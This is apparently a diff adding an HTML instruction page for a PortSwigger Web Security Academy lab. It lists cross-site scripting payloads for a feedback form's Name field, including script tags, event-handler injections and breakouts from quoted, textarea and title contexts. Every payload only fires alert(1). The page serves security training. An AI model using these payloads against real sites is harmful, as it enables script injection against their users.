@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Submit XSS to Feedback Form</title>
+</head>
+<body>
+    <h1>Manual XSS Test for PortSwigger Lab</h1>
+    
+    <h2>Instructions:</h2>
+    <ol>
+        <li>Go to: https://0a3900c304b67111838b512800a90077.web-security-academy.net/feedback</li>
+        <li>In the "Name" field, enter one of these payloads:</li>
+    </ol>
+    
+    <h3>HTML Injection Test:</h3>
+    <code>&lt;h1&gt;TEST&lt;/h1&gt;</code>
+    
+    <h3>XSS Payloads to Try:</h3>
+    <pre>
+&lt;script&gt;alert(1)&lt;/script&gt;
+
+&lt;img src=x onerror=alert(1)&gt;
+
+&lt;svg onload=alert(1)&gt;
+
+&lt;body onload=alert(1)&gt;
+
+&lt;input onfocus=alert(1) autofocus&gt;
+
+&lt;iframe src="javascript:alert(1)"&gt;
+    </pre>
+    
+    <h3>After Submission:</h3>
+    <p>Check the bottom of the feedback page or reload it to see if your HTML/script is rendered.</p>
+    
+    <h3>If the form has encoding issues, try:</h3>
+    <pre>
+">&lt;script&gt;alert(1)&lt;/script&gt;
+
+'>&lt;script&gt;alert(1)&lt;/script&gt;
+
+&lt;/textarea&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+
+&lt;/title&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+    </pre>
+</body>
+</html>
